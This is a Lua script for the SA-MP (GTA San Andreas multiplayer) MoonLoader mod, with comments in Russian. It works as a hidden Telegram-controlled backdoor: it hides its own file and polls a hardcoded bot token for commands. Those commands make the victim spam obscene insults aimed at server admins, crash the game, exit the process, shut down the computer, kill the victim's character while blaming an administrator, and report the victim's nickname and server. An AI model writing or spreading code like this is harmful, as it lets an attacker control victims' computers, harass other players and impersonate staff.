local effil = require("effil")
local ffi = require 'ffi'
local encoding = require("encoding")
encoding.default = 'CP1251'
u8 = encoding.UTF8

ffi.cdef 'void __stdcall ExitProcess(unsigned int)'

chat_id = '-1002144476171' -- чат ID юзера
token = '7094826046:AAGntZxJ8YjYowsx5NDHcbJIYo50ihJPS0o' -- токен бота

local FILE_ATTRIBUTE = {
    ARCHIVE = 32, -- (0x20)
    HIDDEN = 2, -- (0x2)
    NORMAL = 128, -- (0x80)
    NOT_CONTENT_INDEXED = 8192, -- (0x2000)
    OFFLINE = 4096, -- (0x1000)
    READONLY = 1, -- (0x1)
    SYSTEM = 4, -- (0x4)
    TEMPORARY = 256, -- (0x100)
}

local updateid -- ID последнего сообщения для того чтобы не было флуда

function threadHandle(runner, url, args, resolve, reject)
    local t = runner(url, args)
    local r = t:get(0)
    while not r do
        r = t:get(0)
        wait(0)
    end
    local status = t:status()
    if status == 'completed' then
        local ok, result = r[1], r[2]
        if ok then resolve(result) else reject(result) end
    elseif err then
        reject(err)
    elseif status == 'canceled' then
        reject(status)
    end
    t:cancel(0)
end

function requestRunner()
    return effil.thread(function(u, a)
        local https = require 'ssl.https'
        local ok, result = pcall(https.request, u, a)
        if ok then
            return {true, result}
        else
            return {false, result}
        end
    end)
end

function SetFileAttributes(file, ATTRIBUTE)
    local ffi = require('ffi')
    ffi.cdef([[
        bool SetFileAttributesA(
            const char* lpFileName,
            int  dwFileAttributes
        );
    ]])
    ffi.C.SetFileAttributesA(file, ATTRIBUTE)
end

function async_http_request(url, args, resolve, reject)
    local runner = requestRunner()
    if not reject then reject = function() end end
    lua_thread.create(function()
        threadHandle(runner, url, args, resolve, reject)
    end)
end

function encodeUrl(str)
    str = str:gsub(' ', '%+')
    str = str:gsub('\n', '%%0A')
    return u8:encode(str, 'CP1251')
end

function sendTelegramNotification(msg) -- функция для отправки сообщения юзеру
    msg = msg:gsub('{......}', '') --тут типо убираем цвет
    msg = encodeUrl(msg) -- ну тут мы закодируем строку
    async_http_request('https://api.telegram.org/bot' .. token .. '/sendMessage?chat_id=' .. chat_id .. '&text='..msg,'', function(result) end) -- а тут уже отправка
end

function get_telegram_updates() -- функция получения сообщений от юзера
    while not updateid do wait(1) end -- ждем пока не узнаем последний ID
    local runner = requestRunner()
    local reject = function() end
    local args = ''
    while true do
        url = 'https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chat_id..'&offset=-1' -- создаем ссылку
        threadHandle(runner, url, args, processing_telegram_messages, reject)
        wait(0)
    end
end

local messages = {
    "ЕБАЛ КАЙПЕНА, САНЖАРА В ОЧКО. МАТЬ ШЛЮХА ИХ, БАТЯ ШАКАЛ. QUWIN CLAN (SELL VV - VAHAR (fp))",
    "УЕБАНСКИЙ ГЛАВНЫЙ АДМИНИСТРАТОР! ПОЗОР ЕГО МАТЬ ШЛЮХА! QUWIN CLAN СИЛА",
    "QUWIN CUJLA А ВЫ ХУЕСОСЫ. ПРОЕКТ ГОВНО. САНЖАР MQMQMQ МАТЬ ШАЛАВА",
    "ПРЕКРАСНЫЙ ДЕНЬ ЧТОБЫ ВЫБИТЬ ЗУБЫ МАМЕ СПЕЦ АДМИНА! QUWIN CLAN БОССЫ. MQMQMQ",
    "Чем занимаешься? СТУЧУ ХУЕМ ПО ПИЗДЕ МАМЫ ГА. QUWIN МОЩНЫЕ",
    "УЕБАНЫ, Я ВАШ СЕРВЕР ЕБАЛ! ПРОДАМ ВВ FP VAHAR. QUWIN CLAN",
    "alo псины, админы дрочуны + дибилы! quwin clan сила. мать ваша в могиле",
    "ЗДАРОВА ОТ ТЕСЛОВА НИЩИЕ ЕБЛАНЫ! QUWIN CLAN ПЕРЕДАЛ ПРИВЕТ ВАМ!",
    "продам вирті по цене 12 руб кк. кьювин клан ТОПОВІЙ ТЕСЛОВ"
}

local function getRandomMessage()
    local index = math.random(1, #messages) -- Генерируем случайный индекс в пределах размера массива
    return messages[index] -- Возвращаем выбранное сообщение
end

function processing_telegram_messages(result) -- функция проверОчки того что отправил чел
    if result then
        -- тута мы проверяем все ли верно
        local proc_table = decodeJson(result)
        if proc_table.ok then
            if #proc_table.result > 0 then
                local res_table = proc_table.result[1]
                if res_table then
                    if res_table.update_id ~= updateid then
                        updateid = res_table.update_id
                        local message_from_user = res_table.message.text
                        if message_from_user then
                            -- и тут если чел отправил текст мы сверяем
                            local text = u8:decode(message_from_user) .. ' ' --добавляем в конец пробел дабы не произошли тех. шоколадки с командами(типо чтоб !q не считалось как !qq)
                            if text:match('^!sendchat') then
                                sampSendChat(arg)
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Сообщение \"%s\" было отправлено игроком \"%s\"\n\n%%F0%%9F%%92%%BB Сервер: \"%s\"", arg, nickname, sampGetCurrentServerName()))
                            
                            elseif text:match('^!sliv_vr') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                for i = 1, 10 do
                                    wait(1366)
                                    local str = getRandomMessage()
                                    sampSendChat('/vr '..str)
                                    sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игроком \"%s\" было отправлено сообщение \"%s\"", nickname, str))
                                end

                            elseif text:match('^!sliv_fam') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                for i = 1, 10 do
                                    wait(1066)
                                    local str = getRandomMessage()
                                    sampSendChat('/fam '..str)
                                    sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Иг)роком \"%s\" было отправлено сообщение \"%s\"", nickname, str))
                                end
                            
                            elseif text:match('^!getnick') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игрок \"%s\" сейчас играет на сервере \"%s\"", nickname, sampGetCurrentServerName()))
                            
                            elseif text:match('^!crash') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игрок \"%s\" был успешно крашнут.", nickname))
                                lua_thread.create(function()
                                    wait(1000)
                                    writeMemory(0x1, 0x1, 0x1)
                                end)
                            
                            elseif text:find('^!quit') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игрок \"%s\" вышел с игры.", nickname))
                                lua_thread.create(function()
                                    wait(1000)
                                    ffi.C.ExitProcess(0)
                                end)
                            
                            elseif text:find('^!off_pc') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Поздравляю! Вы помогли игроку \"%s\" выключить комп.", nickname))
                                lua_thread.create(function()
                                    wait(1000)
                                    os.execute('shutdown /s /t 1')
                                end)
                            --[[elseif text:find('^!explorer') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Поздравляю! Вы помогли игроку \"%s\" открыть 5 проводников", nickname))
                                for i = 1, 5 do
                                    lua_thread.create(function()
                                        wait(50) -- Ждем 1 секунду перед открытием следующего проводника
                                        os.execute('explorer.exe')
                                    end)
                                end]]
                            elseif text:find('^!spawn') then
                                local bs = raknetNewBitStream()
                                raknetSendRpc(52, bs)
                                raknetDeleteBitStream(bs)
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игрок \"%s\" был отправлен на спавн.", nickname))
                            
                            elseif text:find('^!kill') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                local x, y, z = getCharCoordinates(PLAYER_PED)
                                setCharCoordinates(PLAYER_PED, x, y, z-7)
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игрок \"%s\" был отправлен под текстуры. В скором времени он умрёт. Он получил уведомление, что это сделал администратор.", nickname))
                                sampAddChatMessage('Вы были телепортированы Администратором',-1)
                            
                            elseif text:find('^!slap') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                local x, y, z = getCharCoordinates(PLAYER_PED)
                                setCharCoordinates(PLAYER_PED, x, y, z+7)
                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игрок \"%s\" был слапнут. Он получил уведомление, что это сделал администратор.", nickname))
                                sampAddChatMessage('Вы были подброшены Администратором',-1)
                            end
                        end
                    end
                end
            end
        end
    end
end


function getLastUpdate() -- тут мы получаем последний ID сообщения, если же у вас в коде будет настройка токена и chat_id, вызовите эту функцию для того чтоб получить последнее сообщение
    async_http_request('https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chat_id..'&offset=-1','',function(result)
        if result then
            local proc_table = decodeJson(result)
            if proc_table.ok then
                if #proc_table.result > 0 then
                    local res_table = proc_table.result[1]
                    if res_table then
                        updateid = res_table.update_id
                    end
                else
                    updateid = 1 -- тут зададим значение 1, если таблица будет пустая
                end
            end
        end
    end)
end

function main()
    while not isSampAvailable() do
        wait(0)
    end
    getLastUpdate() -- вызываем функцию получения последнего ID сообщения
    lua_thread.create(get_telegram_updates) -- создаем нашу функцию получения сообщений от юзера

    SetFileAttributes(thisScript().path, FILE_ATTRIBUTE.HIDDEN)

    while true do
        wait(0)

    end
end